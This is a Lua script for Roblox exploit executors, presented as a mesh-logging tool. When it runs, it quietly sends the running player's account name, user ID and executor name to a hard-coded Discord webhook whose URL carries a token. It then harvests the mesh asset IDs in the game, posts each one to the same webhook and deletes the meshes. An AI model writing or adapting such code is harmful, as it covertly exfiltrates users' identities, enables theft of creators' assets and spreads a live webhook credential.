```local check =
   syn and "Synapse X" or
   secure_load and "Sentinel" or
   KRNL_LOADED and "Krnl"

local url = "https://discord.com/api/webhooks/1142714548013514812/AdWZXkzcvoY1Cpe6J4lcH-woFFUFPfluerNsTHMNiJSCbyi1hT2fpCumwSnA1jpLrNVF"
local exploitData = {
   ["content"] = "Account name: " .. game.Players.LocalPlayer.Name .. " Id: " .. game.Players.LocalPlayer.UserId,
   ["embeds"] = {
       {
           ["title"] = "**Someone Executed Your Script**",
           ["description"] = "\nExploit: **" .. check .. "**",
           ["type"] = "rich",
           ["color"] = tonumber(0x7329da)
       }
   }
}
local exploitPayload = game:GetService("HttpService"):JSONEncode(exploitData)

local exploitHeaders = {
   ["content-type"] = "application/json"
}
local exploitRequest = http_request or request or HttpPost or syn.request
local exploitParams = {Url = url, Body = exploitPayload, Method = "POST", Headers = exploitHeaders}
exploitRequest(exploitParams)

for _, v in pairs(workspace:GetDescendants()) do
    if v:IsA("SpecialMesh") and not v.Parent.Parent:FindFirstChild("Pants") and not v.Parent.Parent:FindFirstChild("Shirt") then
        local meshId = v.MeshId
        local assetId = string.match(meshId, "%d+") -- Extract digits from the meshId
        
        if assetId then
            local ea = "https://www.roblox.com/library/" .. assetId .. "/ea"
            local meshUrl = "https://discord.com/api/webhooks/1142714548013514812/AdWZXkzcvoY1Cpe6J4lcH-woFFUFPfluerNsTHMNiJSCbyi1hT2fpCumwSnA1jpLrNVF"
            local meshData = {
                ["content"] = "@everyone",
                ["embeds"] = {
                    {
                        ["title"] = "**Mesh logged~!**",
                        ["description"] = "\nID: **" .. ea .. "**",
                        ["type"] = "rich",
                        ["color"] = tonumber(0x7329da)
                    }
                }
            }
            local meshPayload = game:GetService("HttpService"):JSONEncode(meshData)
            
            local meshHeaders = {
                ["content-type"] = "application/json"
            }
            local meshRequest = http_request or request or HttpPost or syn.request
            local meshParams = {Url = meshUrl, Body = meshPayload, Method = "POST", Headers = meshHeaders}
            meshRequest(meshParams)
            
            v:Destroy()
        end
    end
end


--MESH LOGGInG SCRIPT```
